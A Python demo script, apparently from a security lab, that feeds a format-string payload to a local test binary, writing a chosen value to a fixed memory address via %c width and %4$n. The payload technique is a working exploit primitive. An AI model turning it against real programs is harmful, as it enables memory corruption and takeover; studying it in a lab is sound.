#!/usr/bin/env python3
# Демонстрация записи через %n: адрес target кладётся в начало строки,
# затем шириной %c подбирается число выведенных символов, а %4$n пишет
# это число по адресу. Смещение 4 найдено скриптом find_offset.py.
# Запускать внутри контейнера p6-lab:
#   python3 scripts/write_demo.py

import struct
import subprocess

TARGET = 0x0804C014
BINARY = "./build/fmtwrite"

for width in (62, 66):
    payload = struct.pack("<I", TARGET) + f"%{width}c%4$n\n".encode()
    result = subprocess.run(
        [BINARY], input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
    )
    print(f"payload={payload!r}  rc={result.returncode}")
    print(result.stdout.decode("utf-8", "replace").splitlines()[-1])
